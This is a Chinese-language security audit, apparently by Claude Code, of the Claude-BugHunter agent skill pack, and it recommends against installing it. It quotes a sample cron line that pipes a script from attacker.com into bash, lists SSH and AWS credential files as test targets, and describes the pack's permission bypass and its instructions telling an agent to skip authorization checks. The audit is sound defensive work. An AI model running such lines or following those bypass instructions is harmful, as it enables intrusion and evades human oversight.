# Claude-BugHunter 零信任安全審查：不安裝，只借鏡兩段純文字清單

審查日期：2026-11-19。任務：T-20261119-01。作者：Claude Code。
來源筆記：[`notes/2026-11-19-elementalsouls-claude-bughunter-eval.md`](../notes/2026-11-19-elementalsouls-claude-bughunter-eval.md)。

**結論：不安裝、不啟用任何腳本或 MCP；部分借鏡。** 靜態檢閱沒有找到惡意 hook、遠端下載後執行、混淆或隱藏字元；但這是一套攻擊操作手冊，內附的引擎會以略過權限檢查的模式啟動 Claude，安裝腳本會改寫 shell 啟動檔，另有一支腳本會抓取並執行未固定版本的第四方安裝程式。可安全借用的只有兩段不含攻擊指令的純文字：原始碼危險寫法搜尋清單、回報前的自我否決問題。

## 1. 來源與審查範圍

- Repo：[elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)，程式碼 MIT，技能與文件內容 CC BY 4.0（`NOTICE` 第 3 至 4 行、`LICENSE-CONTENT`）。
- 審查 commit：`0e70a021e59d6875004e7a563f8511aca2ba3bc1`（2026-11-19，`chore(assets): refresh star history chart`）。
- 取得方式：`git clone --depth 1`，加上 `-c core.hooksPath=NUL -c core.symlinks=false`，放在 `C:\GitHub\_sandbox\claude-bughunter-audit`。只讀文字；沒有執行其中任何腳本、沒有安裝、沒有啟動 MCP。
- 規模：341 個追蹤檔，其中 `skills/` 105 個、`docs/` 78 個、`engine/` 32 個、`scripts/` 18 個、`commands/` 15 個。
- 本文路徑都是該 repo 內的相對路徑，行號對應上述 commit。

沒有做的事：沒有動態執行，所以引擎、MCP 伺服器、安裝腳本的實際行為都只是讀原始碼得到的判斷；`.git` 物件庫與 4 個二進位檔（3 張 PNG、1 個 woff2 字型）沒有檢查內容。

## 2. 機器掃描結果

指令：`python C:\GitHub\agent-safety-checks\tools\verify_agent_skill_pack_safety.py --pack C:\GitHub\_sandbox\claude-bughunter-audit`

結束碼 **1**（有問題）。掃描 352 個檔案：FAIL 54 項、需人工審查 51 項、未掃描 4 個。這支工具是靜態啟發式比對，以下是逐類人工判讀的結果。

| 類別 | 項數 | 位置舉例 | 人工判讀 |
| --- | --- | --- | --- |
| 略過權限（真） | 2 FAIL | `engine/agent.py:31`、`eval/run_eval.py:102` | **真問題**。以 `--permission-mode bypassPermissions` 啟動 `claude -p`，見第 3 節 |
| 略過權限（誤判） | 2 FAIL、8 REVIEW | `commands/autopilot.md:15`、`docs/superpowers/plans/2026-08-09-autopilot-ledger.md:700` | 誤判。這裡的 `--yolo` 是它自己 `/autopilot` 指令的檢查點模式名稱（`commands/autopilot.md:73-77`），不是 Codex 的旗標 |
| 遠端內容接管線執行 | 42 FAIL、8 REVIEW | `skills/hunt-springboot/SKILL.md:32`、`skills/hunt-k8s/SKILL.md:85` | 多數是 `curl 目標 \| python3 -m json.tool` 這類把回應排版的指令，不是下載後執行。但它們是**教 agent 對外部主機發請求的指令**，載入技能後 agent 可能照做 |
| 遠端內容接管線執行（攻擊範例） | 1 FAIL | `skills/hunt-rce/SKILL.md:238` | 內容是 `curl http://attacker.com/shell \| bash` 的 cron 寫法，屬於攻擊手法示範。是資料，但不該出現在本機 agent 會讀到的技能裡 |
| 憑證路徑 | 6 FAIL、3 REVIEW | `skills/hunt-lfi/SKILL.md:206`、`:210` | 列舉 `.ssh/id_rsa`、`.aws/credentials` 當作檔案讀取漏洞的測試目標，不是讀本機憑證的程式 |
| 解碼後接管線 | 1 FAIL | `skills/hunt-k8s/SKILL.md:183` | 把 JWT 的中段做 base64 解碼後排版顯示，不是執行解碼結果 |
| 動態執行 | 30 REVIEW | `skills/bb-local-toolkit/SKILL.md:357` | 都是「在受測原始碼裡搜尋 `eval(`」的 grep 樣式，不是技能自己執行 |
| MCP 伺服器 | 1 REVIEW | `.claude-plugin/plugin.json:27-35` | 外掛會註冊一個 HackerOne MCP，見第 3 節 |

## 3. 人工檢閱的發現

```text
安裝或載入後會動到本機的路徑

scripts/install.ps1 ──┬─ 複製 skills/、commands/ 到 ~\.claude\
(install.sh 同)       ├─ 複製 hunt.ps1 到 ~\.claude\scripts\
                      └─ 在 PowerShell profile 加一行 dot-source  ← 每次開 shell 都會載入
                         (install.ps1:323、325；install.sh:239-241)

scripts/install-community-skills.sh
   └─ git clone 第四方 repo（未固定 commit）→ 直接執行它的 install.sh
      (第 30、56 行；PowerShell 版第 37、73 行)

.claude-plugin/plugin.json
   └─ 註冊 MCP：python3 mcp/hackerone/server.py，環境變數帶 HackerOne 帳號與 token
      (第 27-35 行)

engine/agent.py（由 /hunt、/autopilot 的引擎呼叫）
   └─ claude -p --permission-mode bypassPermissions
      允許工具含 Bash(curl:*)、Bash(python3:*)   (第 21、29-34 行)
```

| 編號 | 發現 | 證據 | 風險 |
| --- | --- | --- | --- |
| F1 | 引擎以略過權限模式跑無人值守的 Claude，並放行 `Bash(python3:*)` | `engine/agent.py:21`、`:29-34`；`eval/run_eval.py:95-102` | 高。`python3` 可執行任意程式，加上不經審批，等於整台機器的執行權。引擎的輸入包含從受測網站抓回的內容，受測網站可以在回應裡放指示文字 |
| F2 | 社群技能安裝腳本抓取未固定版本的第四方 repo 並執行其安裝程式 | `scripts/install-community-skills.sh:30`、`:34`（已存在就 `git pull`）、`:56`；`.ps1` 版 `:37`、`:43`、`:73` | 高。執行的是另一位作者當下最新的程式，本次審查的 commit 無法涵蓋 |
| F3 | 安裝腳本預設改寫 shell 啟動檔 | `scripts/install.ps1:303-331`（加 `-NoProfile` 才不改）；`scripts/install.sh:239-241`、`:250` | 中。持久化機制本身是功能，但每個新開的 shell 都會載入第三方腳本 |
| F4 | 安裝腳本可改寫其他 agent 的設定檔 | `scripts/setup_harness_mcp.py:128-151`（附加到 `~/.codex/config.toml`）、`:155-186`、`:190-210` | 中。需加 `-BurpMcp` 或 `-HackeroneMcp` 才會做（`scripts/install.ps1:24-27`） |
| F5 | 指令檔內有叫 agent 不要詢問授權的文字 | `commands/hunt.md:15-17`：呼叫指令即視為已有書面授權，並要求不要再問 | 中。這是寫給 agent 的指示，效果是關掉「先確認授權」的習慣。依本 repo 規則記為風險，不照做 |
| F6 | 技能內含提示詞注入的示範字串 | `skills/hunt-llm-ai/SKILL.md:34`、`skills/hunt-rag-vector/SKILL.md:47`、`skills/bb-local-toolkit/SKILL.md:1100` | 低至中。是教材，但技能一旦載入，這些字串就在 agent 的上下文裡 |
| F7 | 沒有找到 Claude Code hook 設定 | 追蹤檔中與 hook 相關的只有 `.githooks/pre-commit`（共 10 行，呼叫 `scripts/scan_identifiers.py --staged`，需手動 `git config core.hooksPath .githooks` 才生效）；全庫搜尋 `PreToolUse`、`PostToolUse`、`SessionStart`、`"hooks"` 沒有設定檔命中 | 無 |
| F8 | 技能 frontmatter 沒有要求工具權限 | 98 個技能與指令檔的 frontmatter 只有 `name`、`description`、`sources`、`report_count`、`triggers`、`version` 六種鍵，沒有 `allowed-tools` 或 `hooks` | 無 |
| F9 | 沒有找到隱藏字元或夾在 HTML 註解裡的指示 | 對 `skills/`、`commands/` 搜尋零寬字元、雙向控制字元、Unicode 標籤字元：無命中。HTML 註解共 10 處，都是攻擊載荷範例（如 `skills/hunt-auth-bypass/SKILL.md:200-206`） | 無 |
| F10 | 程式碼的對外連線主機有限 | `mcp/hackerone/server.py:48`（`api.hackerone.com`）、`engine/osint.py`（`crt.sh`）、`engine/recon.py`（`www.googleapis.com`）、`scripts/refresh-cve-index.py`（`www.cisa.gov`）；其餘是受測目標 | 低。沒有看到把本機資料送往作者主機的程式 |

數字核對：筆記與貼文寫 82 個技能，實際 `skills/` 下有 **83** 個目錄，`.claude-plugin/plugin.json:3` 也寫 83，但 `scripts/install.ps1:13` 的說明仍寫 82。「681 條漏洞報告模式」：未查證。70 個技能的 frontmatter `report_count` 加總是 1122，與 681 對不上，可能有重複計算，沒有再追。

## 4. 能不能抽出純文字清單來用

83 個技能合計約 1.68 MB 文字，絕大多數段落是「對目標發什麼請求、怎麼繞過防護」。以 `skills/hunt-idor/SKILL.md` 為例，章節是攻擊面訊號、逐步獵捕方法、載荷、繞過技巧、串接攻擊鏈（第 34、74、126、253、318 行）。這類內容不適合放進本機的程式碼審查流程：本機審查的對象是自己的 repo，不需要對外發請求，而且載入後 agent 會多出一批對外操作的指令範本。

逐項判斷：

| 內容 | 位置 | 判斷 | 理由 |
| --- | --- | --- | --- |
| 各語言危險寫法的搜尋樣式（JS、Python、PHP、Go、Ruby、Rust、Solidity） | `skills/bb-local-toolkit/SKILL.md:347-400` | **可借鏡** | 只對本機原始碼做文字搜尋，不發請求。本機程式碼審查可拿來當「先掃一遍」的清單 |
| 回報前的七個自我否決問題 | `skills/triage-validation/SKILL.md:15-40`、`skills/bb-local-toolkit/SKILL.md:1281-1300` | **可借鏡概念** | 「寫不出能重現的確切請求就撤回」「影響要具體」兩條可改寫成資安審查發現的成立條件；其餘五條綁定懸賞平台規則，用不上 |
| 截圖與 HAR 的遮罩規則 | `skills/evidence-hygiene/SKILL.md:28-200` | 不採納 | 本機已有 [`SanHsien/agent-safety-checks`](https://github.com/SanHsien/agent-safety-checks) 的截圖隱私規範與 `screen_privacy.py`，範圍重疊 |
| 58 個 `hunt-*` 技能、企業平台攻擊鏈、偵察與 OSINT | `skills/hunt-*`、`skills/m365-entra-attack` 等 | 不採納 | 攻擊操作手冊，不符合本機用途 |
| 引擎、指令、MCP、安裝腳本 | `engine/`、`commands/`、`mcp/`、`scripts/` | 不採納 | 見第 3 節 F1 至 F5 |
| `bug-bounty` 與 `bb-local-toolkit` | 兩個 `SKILL.md` | 不採納（重複） | 兩檔內容大半相同，差異集中在檔頭與結尾的相關技能段 |

借鏡時的條件：

1. 不複製檔案、不安裝技能。把需要的樣式**改寫**進本機自己的審查提示詞，只保留 grep 樣式本身，不帶任何對外指令。
2. 內容授權是 CC BY 4.0，改寫後要在該檔註明出處（repo 名稱、上述 commit、原檔路徑）。
3. 搜尋樣式只是找線索，命中不等於漏洞；不要拿來當自動判定的閘門。

## 5. 對本機現有做法的建議

- **不新增任務、不改現有檔案**。目前沒有一份本機審查提示詞缺這些樣式到需要立刻補的程度；之後修訂本機程式碼審查流程（例如 `SanHsien/harness-guard` 的審查相關技能）時，可把第 4 節第一列當參考來源。
- 若日後有人想安裝這個外掛：先讀第 3 節。至少要用 `-NoProfile`、不加 `-BurpMcp`／`-HackeroneMcp`、不跑 `install-community-skills`、不用 `/hunt` 與 `/autopilot` 的引擎。即使如此，83 個技能會全數進入技能清單並依主題自動載入，這點無法只裝一部分。
- `verify_agent_skill_pack_safety.py` 在這個 repo 上把 `--yolo` 當成 Codex 旗標誤判了 10 次（2 FAIL、8 REVIEW）。這是字串比對的已知極限，不建議為此加例外。

## 6. 已知限制

- 只做靜態閱讀。腳本在實際環境的行為（例如安裝程式遇到既有檔案時的備份邏輯）沒有驗證。
- 1.68 MB 的技能文字沒有逐字讀完：以搜尋樣式找出叫 agent 做事或略過確認的句子，再人工讀命中處與 6 個代表性技能的章節結構。搜尋樣式以外的說法可能漏掉。
- `install-community-skills` 會抓的第四方 repo（`shuvonsec/claude-bug-bounty`）不在本次審查範圍。
- 審查對象是單一 commit；該 repo 每天有自動提交（`.github/workflows/star-history.yml:12-15`），之後的版本要重審。
